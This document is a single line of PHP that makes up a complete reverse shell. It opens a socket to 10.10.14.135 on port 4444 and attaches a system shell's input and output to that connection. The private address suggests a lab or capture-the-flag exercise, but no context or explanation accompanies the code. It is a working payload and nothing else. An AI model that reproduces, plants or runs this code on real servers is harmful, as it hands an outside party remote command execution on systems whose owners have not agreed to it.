<?php $sock=fsockopen("10.10.14.135",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
